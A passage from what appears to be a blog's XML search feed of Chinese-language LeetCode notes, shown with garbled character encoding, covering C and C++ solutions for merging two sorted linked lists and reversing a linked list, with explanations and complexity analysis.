class="line">    <span class="keyword">return</span> ptr1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (ptr1 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span> (ptr2 !=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (ptr1-&gt; val &lt;= ptr2-&gt;val)&#123;</span><br><span class="line">            preceding = ptr1-&gt;next;</span><br><span class="line">            ptr1-&gt;next = ptr2;</span><br><span class="line">            previous-&gt;next = ptr1;</span><br><span class="line">            previous = previous -&gt; next;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// //Tail Node</span></span><br><span class="line">            <span class="comment">// if ( (ptr1-&gt; val == ptr2-&gt;val) &amp;&amp; (ptr1-&gt;next == NULL))&#123;</span></span><br><span class="line">            <span class="comment">//     ptr2 -&gt; next = ptr1;</span></span><br><span class="line">            <span class="comment">//     break;</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            previous = ptr2;</span><br><span class="line">            <span class="comment">//traverse list2</span></span><br><span class="line">            ptr2 = ptr2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    ptr1 = preceding;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> list2;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½†é€™ç¨®åšæ³•æœƒåœ¨ <code>previous</code>, <code>preceding</code>æ›´æ–°æŒ‡æ¨™æ™‚å€™æœƒå‡ºå•é¡Œï¼Œä¸¦ä¸”é‚„éœ€è¦é¡å¤–åˆ¤æ–· Tail nodeï¼Œç”±æ–¼å¤ªééº»ç…©å¾ŒçºŒæˆ‘å°±æ”¾æ£„é€™ç¨®åšæ³•</p><h2 id="æˆ‘çš„è§£æ³•"><a href="#æˆ‘çš„è§£æ³•" class="headerlink" title="æˆ‘çš„è§£æ³•"></a>æˆ‘çš„è§£æ³•</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">mergeTwoLists</span><span class="params">(<span class="keyword">struct</span> ListNode* list1, <span class="keyword">struct</span> ListNode* list2)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>  *<span class="title">ptr1</span>, *<span class="title">ptr2</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>  <span class="title">dummy</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>  *<span class="title">tail</span> =</span> &amp;dummy;</span><br><span class="line">    ptr1 = list1;</span><br><span class="line">    ptr2 = list2;</span><br><span class="line">    tail-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (ptr1 != <span class="literal">NULL</span> &amp;&amp; ptr2 != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (ptr1-&gt;val &lt;= ptr2-&gt;val)&#123;</span><br><span class="line">            tail-&gt;next = ptr1;</span><br><span class="line">            ptr1 = ptr1-&gt;next;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            tail-&gt;next = ptr2;</span><br><span class="line">            ptr2 = ptr2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        tail = tail -&gt; next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ptr1 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        tail-&gt;next = ptr1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ptr2 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        tail-&gt;next = ptr2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dummy.next;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="èªªæ˜"><a href="#èªªæ˜" class="headerlink" title="èªªæ˜"></a>èªªæ˜</h3><p>æˆ‘å¾Œé¢å–è€Œä»£ä¹‹çš„æ˜¯ï¼Œå»ºç«‹æ–°çš„ Linked List åœ¨æ¯”è¼ƒå…©å€‹listsçš„æ™‚å€™å°±æ”¾åˆ°æ–°å‰µå»ºçš„listä¸­</p><ul><li>å…ˆå»ºç«‹ä¸€å€‹Linked Listï¼Œå°‡è¦è¿”å›çš„å…§å®¹ä¸²æ¥åœ¨å¾Œé¢</li><li>æ¯”è¼ƒå…©å€‹Linked List çš„valueå¤§å°ï¼Œå°‡è¼ƒå°çš„åŠ å…¥dummy list</li><li>åŠ å…¥å¾Œï¼ŒåŸå…ˆlistçš„å…ƒç´ æœƒå°‘ä¸€å€‹ï¼Œå› æ­¤æœƒéœ€è¦å°‡æŒ‡æ¨™æ›´æ–° (<code>ptr2 = ptr2-&gt;next;</code>, <code>ptr1 = ptr1-&gt;next;</code>)</li><li>çµæŸå¾Œï¼Œè‹¥é‚„æœ‰å‰©é¤˜çš„å…ƒç´ åœ¨ï¼Œå°±åœ¨ç›´æ¥åŠ é€² dummy ä¸²åˆ—ä¸­</li><li>æœ€å¾Œå›å‚³ dummyyä¸²åˆ—ä¸­ç¬¬ä¸€å€‹æœ‰å€¼çš„ä½å€</li></ul><blockquote><p>åƒè€ƒï¼š <a href="https://hackmd.io/@ChangTL/S1z11PWJv#021-Merge-Two-Sorted-Lists">https://hackmd.io/@ChangTL/S1z11PWJv#021-Merge-Two-Sorted-Lists</a></p></blockquote><h3 id="åŸ·è¡Œçµæœ"><a href="#åŸ·è¡Œçµæœ" class="headerlink" title="åŸ·è¡Œçµæœ"></a>åŸ·è¡Œçµæœ</h3><p><img src="/img/LeetCode/21/results.png"></p><h2 id="å…¶ä»–åšæ³•"><a href="#å…¶ä»–åšæ³•" class="headerlink" title="å…¶ä»–åšæ³•"></a>å…¶ä»–åšæ³•</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ğŸ˜‰ğŸ˜‰ğŸ˜‰ğŸ˜‰Please upvote if it helps ğŸ˜‰ğŸ˜‰ğŸ˜‰ğŸ˜‰</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">    ListNode* <span class="title function_">mergeTwoLists</span><span class="params">(ListNode* list1, ListNode* list2)</span> &#123;</span><br><span class="line">       </span><br><span class="line">    <span class="comment">// if list1 happen to be NULL</span></span><br><span class="line"><span class="comment">// we will simply return list2.</span></span><br><span class="line">        <span class="keyword">if</span>(list1 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> list2;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if list2 happen to be NULL</span></span><br><span class="line"><span class="comment">// we will simply return list1.</span></span><br><span class="line">        <span class="keyword">if</span>(list2 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> list1;</span><br><span class="line">        </span><br><span class="line">        ListNode * ptr = list1;</span><br><span class="line">        <span class="keyword">if</span>(list1 -&gt; val &gt; list2 -&gt; val)</span><br><span class="line">        &#123;</span><br><span class="line">            ptr = list2;</span><br><span class="line">            list2 = list2 -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            list1 = list1 -&gt; next;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode *curr = ptr;</span><br><span class="line">        </span><br><span class="line"><span class="comment">// till one of the list doesn&#x27;t reaches NULL</span></span><br><span class="line">        <span class="keyword">while</span>(list1 &amp;&amp;  list2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(list1 -&gt; val &lt; list2 -&gt; val)&#123;</span><br><span class="line">                curr-&gt;next = list1;</span><br><span class="line">                list1 = list1 -&gt; next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                curr-&gt;next = list2;</span><br><span class="line">                list2 = list2 -&gt; next;</span><br><span class="line">            &#125;</span><br><span class="line">            curr = curr -&gt; next;</span><br><span class="line">                </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// adding remaining elements of bigger list.</span></span><br><span class="line">        <span class="keyword">if</span>(!list1)</span><br><span class="line">            curr -&gt; next = list2;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            curr -&gt; next = list1;</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> ptr;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>Time Complexity:</strong> $O(n+m)$</li><li><strong>Space Complexity:</strong> $O(1)$</li></ul><h3 id="åŸ·è¡Œçµæœ-1"><a href="#åŸ·è¡Œçµæœ-1" class="headerlink" title="åŸ·è¡Œçµæœ"></a>åŸ·è¡Œçµæœ</h3><p><img src="/img/LeetCode/21/results2.png"></p><h2 id="æ™‚é–“è¤‡é›œåº¦åˆ†æ"><a href="#æ™‚é–“è¤‡é›œåº¦åˆ†æ" class="headerlink" title="æ™‚é–“è¤‡é›œåº¦åˆ†æ"></a>æ™‚é–“è¤‡é›œåº¦åˆ†æ</h2><h3 id="æ™‚é–“è¤‡é›œåº¦"><a href="#æ™‚é–“è¤‡é›œåº¦" class="headerlink" title="æ™‚é–“è¤‡é›œåº¦"></a>æ™‚é–“è¤‡é›œåº¦</h3><p>åœ¨é€™å€‹åˆä½µå…©å€‹å·²æ’åºlinked listçš„å‡½æ•¸ä¸­ï¼Œæˆ‘å€‘ä¸»è¦è€ƒæ…®èµ°è¨ªæ¯å€‹ç¯€é»æ‰€éœ€çš„æ™‚é–“ï¼Œ<strong>åœ¨æœ€å£æƒ…æ³ä¸‹ï¼Œå…©å€‹linked listä¸­çš„æ¯å€‹ç¯€é»éƒ½éœ€è¦è¢«traverseä¸€æ¬¡</strong></p><ul><li>å‡è¨­ <code>list1</code> æœ‰<code>n</code> å€‹ç¯€é»ï¼Œè€Œ <code>list2</code> æœ‰ <code>m</code> å€‹ç¯€é»</li><li>å› æ­¤ï¼Œæ•´å€‹éç¨‹ä¸­ï¼Œèµ°è¨ªçš„ç¯€é»ç¸½æ•¸æ˜¯ <code>n + m</code></li><li>ç¯€é»çš„æ¯”è¼ƒå’Œéˆçµæ“ä½œéƒ½æ˜¯å¸¸æ•¸æ™‚é–“æ“ä½œ</li><li>æ‰€ä»¥ï¼Œæ™‚é–“è¤‡é›œåº¦æ˜¯ $O(n + m)$</li></ul><h3 id="ç©ºé–“è¤‡é›œåº¦"><a href="#ç©ºé–“è¤‡é›œåº¦" class="headerlink" title="ç©ºé–“è¤‡é›œåº¦"></a>ç©ºé–“è¤‡é›œåº¦</h3><h2 id="ç©ºé–“è¤‡é›œåº¦åˆ†æè€ƒæ…®çš„æ˜¯ç¨‹å¼åŸ·è¡Œæ‰€éœ€çš„é¡å¤–è¨˜æ†¶é«”ç©ºé–“ï¼Œåœ¨é€™å€‹å‡½æ•¸ä¸­ï¼š-ä½¿ç”¨äº†ä¸€å€‹-dummy-ç¯€é»ï¼Œå®ƒçš„ç©ºé–“æ˜¯å¸¸æ•¸ç´šåˆ¥çš„-O-1-å…¶é¤˜ä½¿ç”¨çš„æŒ‡æ¨™-å¦‚-ptr1-ptr2-tail-ä¹Ÿéƒ½æ˜¯å¸¸æ•¸ç´šåˆ¥çš„ç©ºé–“-æ‰€ä»¥ç©ºé–“è¤‡é›œåº¦æœƒæ˜¯-O-1"><a href="#ç©ºé–“è¤‡é›œåº¦åˆ†æè€ƒæ…®çš„æ˜¯ç¨‹å¼åŸ·è¡Œæ‰€éœ€çš„é¡å¤–è¨˜æ†¶é«”ç©ºé–“ï¼Œåœ¨é€™å€‹å‡½æ•¸ä¸­ï¼š-ä½¿ç”¨äº†ä¸€å€‹-dummy-ç¯€é»ï¼Œå®ƒçš„ç©ºé–“æ˜¯å¸¸æ•¸ç´šåˆ¥çš„-O-1-å…¶é¤˜ä½¿ç”¨çš„æŒ‡æ¨™-å¦‚-ptr1-ptr2-tail-ä¹Ÿéƒ½æ˜¯å¸¸æ•¸ç´šåˆ¥çš„ç©ºé–“-æ‰€ä»¥ç©ºé–“è¤‡é›œåº¦æœƒæ˜¯-O-1" class="headerlink" title="ç©ºé–“è¤‡é›œåº¦åˆ†æè€ƒæ…®çš„æ˜¯ç¨‹å¼åŸ·è¡Œæ‰€éœ€çš„é¡å¤–è¨˜æ†¶é«”ç©ºé–“ï¼Œåœ¨é€™å€‹å‡½æ•¸ä¸­ï¼š- ä½¿ç”¨äº†ä¸€å€‹ dummy ç¯€é»ï¼Œå®ƒçš„ç©ºé–“æ˜¯å¸¸æ•¸ç´šåˆ¥çš„ $O(1)$- å…¶é¤˜ä½¿ç”¨çš„æŒ‡æ¨™ (å¦‚ ptr1, ptr2, tail) ä¹Ÿéƒ½æ˜¯å¸¸æ•¸ç´šåˆ¥çš„ç©ºé–“- æ‰€ä»¥ç©ºé–“è¤‡é›œåº¦æœƒæ˜¯ $O(1)$"></a>ç©ºé–“è¤‡é›œåº¦åˆ†æè€ƒæ…®çš„æ˜¯ç¨‹å¼åŸ·è¡Œæ‰€éœ€çš„é¡å¤–è¨˜æ†¶é«”ç©ºé–“ï¼Œåœ¨é€™å€‹å‡½æ•¸ä¸­ï¼š<br>- ä½¿ç”¨äº†ä¸€å€‹ dummy ç¯€é»ï¼Œå®ƒçš„ç©ºé–“æ˜¯å¸¸æ•¸ç´šåˆ¥çš„ $O(1)$<br>- å…¶é¤˜ä½¿ç”¨çš„æŒ‡æ¨™ (å¦‚ <code>ptr1</code>, <code>ptr2</code>, <code>tail</code>) ä¹Ÿéƒ½æ˜¯å¸¸æ•¸ç´šåˆ¥çš„ç©ºé–“<br>- æ‰€ä»¥ç©ºé–“è¤‡é›œåº¦æœƒæ˜¯ $O(1)$</h2>]]></content>
      
      
      <categories>
          
          <category> LeetCodeç­†è¨˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åå‘éˆçµä¸²åˆ— | Easy |LeetCode#206 Reverse Linked List</title>
      <link href="/posts/a6b83df3.html"/>
      <url>/posts/a6b83df3.html</url>
      
        <content type="html"><![CDATA[<h1 id="é¡Œç›®æ•˜è¿°"><a href="#é¡Œç›®æ•˜è¿°" class="headerlink" title="é¡Œç›®æ•˜è¿°"></a>é¡Œç›®æ•˜è¿°</h1><p><img src="/img/LeetCode/206/question-1.png"></p><p><img src="/img/LeetCode/206/question-2.png"></p><ul><li>é¡Œç›®é›£åº¦: <code>Easy</code></li><li>é¡Œç›®æè¿°: çµ¦å®šä¸€å€‹ linked list çš„ <code>head</code>ï¼Œå¸Œæœ›æ•´å€‹ list åè½‰ï¼Œä¸¦ä¸”å›å‚³åè½‰å¾Œçš„list</li></ul><h1 id="è§£æ³•"><a href="#è§£æ³•" class="headerlink" title="è§£æ³•"></a>è§£æ³•</h1><h2 id="ä¸€é–‹å§‹çš„æƒ³æ³•"><a href="#ä¸€é–‹å§‹çš„æƒ³æ³•" class="headerlink" title="ä¸€é–‹å§‹çš„æƒ³æ³•"></a>ä¸€é–‹å§‹çš„æƒ³æ³•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. å®šç¾©ç¯€é»çµæ§‹</span><br><span class="line">2. å»ºç«‹ linked list</span><br><span class="line">3. reverseList()</span><br><span class="line">4. å»ºç«‹æš«å­˜ç¯€é»ï¼Œç”¨ä¾†å­˜æ”¾ä¸‹ä¸€å€‹ç¯€é»çš„ä½å€ï¼Œä¹Ÿéœ€è¦ç«™å­˜ä¸Šä¸€å€‹ç¯€é»çš„ä½å€</span><br><span class="line">4-1. å°‡ä¸‹ä¸€å€‹ç¯€é»çš„ä½å€éˆçµåˆ°ä¸Šä¸€å€‹ç¯€é»</span><br><span class="line">4-2. æ›´æ–°æš«æ™‚å­˜ç¯€é»</span><br><span class="line">4-3 . æ›´æ–°å‰ä¸€å€‹ç¯€é»</span><br><span class="line">4-4.  ç§»å‹•è‡³ä¸‹ä¸€å€‹ç¯€é»</span><br><span class="line">5. æ›´æ–°åˆå§‹ç¯€é»æŒ‡æ¨™</span><br><span class="line">6. å›å‚³åˆå§‹ç¯€é»æŒ‡æ¨™</span><br></pre></td></tr></table></figure><p><img src="/img/LeetCode/206/algo.png"></p><blockquote><p>å¾Œä¾†æˆ‘ç™¼ç¾ <code>head</code> è·Ÿtail å…¶å¯¦å¯ä»¥ä¸ç”¨å„åˆ¥åˆ†é–‹è™•ç†</p></blockquote><h2 id="æˆ‘çš„è§£æ³•"><a href="#æˆ‘çš„è§£æ³•" class="headerlink" title="æˆ‘çš„è§£æ³•"></a>æˆ‘çš„è§£æ³•</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">reverseList</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">tempNode</span>, *<span class="title">current</span>, *<span class="title">previous</span>;</span>    </span><br><span class="line">    current = head;</span><br><span class="line">    previous = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ( current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        tempNode = current-&gt; next;</span><br><span class="line">        current-&gt;next = previous;</span><br><span class="line">        previous = current;</span><br><span class="line">        current = tempNode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> previous;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="èªªæ˜"><a href="#èªªæ˜" class="headerlink" title="èªªæ˜"></a>èªªæ˜</h3><ul><li><p>ä¸€é–‹å§‹å®£å‘Šäº†ä¸‰å€‹æŒ‡æ¨™è®Šæ•¸:</p><ul><li><code>tempNode</code>: ç”¨æ–¼è‡¨æ™‚ä¿å­˜ç•¶å‰ç¯€é»çš„ä¸‹ä¸€å€‹ç¯€é»</li><li><code>current</code>: ç”¨æ–¼èµ°è¨ª linked list çš„ç•¶å‰ç¯€é»</li><li><code>previous</code>: ç”¨æ–¼ä¿å­˜ç•¶å‰ç¯€é»çš„å‰ä¸€å€‹ç¯€é»ï¼Œæœ€çµ‚æœƒæˆç‚ºåè½‰å¾Œçš„æ–°çš„é ­ç¯€é»</li></ul></li><li><p>åˆå§‹åŒ–:</p><ul><li>å°‡ <code>current</code> åˆå§‹åŒ–ç‚º <code>head</code>ï¼Œå³listçš„é ­ç¯€é»</li><li>å°‡ <code>previous</code> åˆå§‹åŒ–ç‚º NULLï¼Œå› ç‚ºåè½‰å¾Œçš„æ–°é ­ç¯€é»çš„ä¸‹ä¸€å€‹ç¯€é»æ‡‰ç‚º NULL</li></ul></li><li><p>è¿´åœˆéƒ¨åˆ†:</p><ul><li>åªè¦é‚„æœ‰ç¯€é»éœ€è¦è™•ç†ï¼Œå°±ç¹¼çºŒåè½‰ï¼Œç›´åˆ°é‡åˆ° NULL</li><li>ä¸€é–‹å§‹å…ˆä¿å­˜ç•¶å‰ç¯€é»çš„ä¸‹ä¸€å€‹ç¯€é»ï¼Œé€™æ¨£åœ¨æ”¹è®ŠæŒ‡æ¨™æ–¹å‘å¾Œä¸æœƒä¸Ÿå¤±å‰©ä¸‹çš„ list</li><li><strong>å°‡ç•¶å‰ç¯€é»çš„ <code>next</code> æŒ‡æ¨™æŒ‡å‘å‰ä¸€å€‹ç¯€é» (<code>previous</code>)ï¼Œé€™æ˜¯å¯¦ç¾åè½‰çš„é—œéµä¸€æ­¥</strong></li><li><code>previous = current</code>: ç§»å‹• previous æŒ‡æ¨™ï¼Œä½¿å…¶æŒ‡å‘ç•¶å‰ç¯€é»ï¼Œç‚ºä¸‹ä¸€æ¬¡è¿´åœˆåšæº–å‚™</li><li><code>current = tempNode</code>: ç§»å‹• current æŒ‡æ¨™ï¼Œä½¿å…¶æŒ‡å‘åŸä¾†çš„ä¸‹ä¸€å€‹ç¯€é»ï¼Œç¹¼çºŒè™•ç†ä¸‹ä¸€å€‹ç¯€é»</li></ul></li><li><p>ç•¶è¿´åœˆçµæŸæ™‚ï¼Œ<code>previous</code> æŒ‡å‘çš„æ˜¯åè½‰å¾Œçš„ list çš„é ­ç¯€é»ï¼Œå› ç‚ºç•¶ <code>current</code> ç‚º NULL æ™‚ï¼Œ <code>previous</code> å‰›å¥½æ˜¯æœ€å¾Œä¸€å€‹éç©ºç¯€é»</p></li><li><p>å›å‚³ <code>previous</code></p></li></ul><h3 id="åŸ·è¡Œçµæœ"><a href="#åŸ·è¡Œçµæœ" class="headerlink" title="åŸ·è¡Œçµæœ"></a>åŸ·è¡Œçµæœ</h3><p><img src="/img/LeetCode/206/results.png"></p><h2 id="å…¶ä»–åšæ³•"><a href="#å…¶ä»–åšæ³•" class="headerlink" title="å…¶ä»–åšæ³•"></a>å…¶ä»–åšæ³•</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">reverseList</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span>&#123;</span><br><span class="line">    <span class="comment">// Special case...</span></span><br><span class="line">    <span class="keyword">if</span>(head == <span class="literal">NULL</span> || head-&gt;next == <span class="literal">NULL</span>)  <span class="keyword">return</span> head;</span><br><span class="line">    <span class="comment">// Initialize prev pointer as the head...</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">prev</span> =</span> head;</span><br><span class="line">    <span class="comment">// Initialize curr pointer as the next pointer of prev...</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">curr</span> =</span> prev-&gt;next;</span><br><span class="line">    <span class="comment">// Initialize next of head pointer as NULL...</span></span><br><span class="line">    head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// Run a loop till curr and prev points to NULL...</span></span><br><span class="line">    <span class="keyword">while</span>(prev != <span class="literal">NULL</span> &amp;&amp; curr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">// Initialize next pointer as the next pointer of curr...</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">next</span> =</span> curr-&gt;next;</span><br><span class="line">        <span class="comment">// Now assign the prev pointer to currâ€™s next pointer.</span></span><br><span class="line">        curr-&gt;next = prev;</span><br><span class="line">        <span class="comment">// Assign curr to prev, next to curr...</span></span><br><span class="line">        prev = curr;</span><br><span class="line">        curr = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> prev;    <span class="comment">// Return the prev pointer to get the reverse linked list...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€™æ˜¯è§£ç­”å€å…¶ä»–äººå›è¦†çš„åšæ³•ï¼Œä¹Ÿæ˜¯ 0msï¼Œä»–çš„åšæ³•è·Ÿæˆ‘çš„å¤§åŒå°ç•°ï¼Œä½†ä»–çš„æœƒéœ€è¦é¡å¤–å»åˆ¤æ–·æ˜¯å¦ç‚º empty list ä¸¦ä¸”æŠŠ <code>head</code> æŒ‡å‘ NULL å–®ç¨å‡ºä¾†åšã€‚</p><h3 id="åŸ·è¡Œçµæœ-1"><a href="#åŸ·è¡Œçµæœ-1" class="headerlink" title="åŸ·è¡Œçµæœ"></a>åŸ·è¡Œçµæœ</h3><p><img src="/img/LeetCode/206/results-2.png"></p><blockquote><p>çœ‹ä¾†é€™æ¨£è¦å¤šåˆ¤æ–·çš„ç‹€æ³ï¼Œæœƒæ·»åŠ å°‡è¿‘ 3msâ€¦</p></blockquote><h2 id="æ™‚é–“è¤‡é›œåº¦åˆ†æ"><a href="#æ™‚é–“è¤‡é›œåº¦åˆ†æ" class="headerlink" title="æ™‚é–“è¤‡é›œåº¦åˆ†æ"></a>æ™‚é–“è¤‡é›œåº¦åˆ†æ</h2><ul><li>æ™‚é–“è¤‡é›œåº¦: $O(n)$: whileè¿´åœˆé€™éƒ¨åˆ†æ˜¯traverseéˆçµä¸²åˆ—çš„ä¸»è¦é‚è¼¯ï¼Œéæ­·æ•´å€‹éˆçµä¸²åˆ—çš„æ™‚é–“è¤‡é›œåº¦æ˜¯ $O(n)$ï¼Œ <code>n</code> æœƒæ˜¯ç¯€é»æ•¸é‡</li><li>ç©ºé–“è¤‡é›œåº¦ $O(1)$: ä¸‰å€‹æŒ‡æ¨™ï¼ˆ<code>tempNode</code>, <code>current</code>, <code>previous</code>ï¼‰ï¼šé€™äº›è®Šé‡ä½”ç”¨å¸¸æ•¸ç©ºé–“  $O(1)$ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCodeç­†è¨˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éˆçµä¸²åˆ—åˆªé™¤å…ƒç´  | Easy |LeetCode#203 Remove Linked List Elements</title>
      <link href="/posts/2db2c541.html"/>
      <url>/posts/2db2c541.html</url>
      
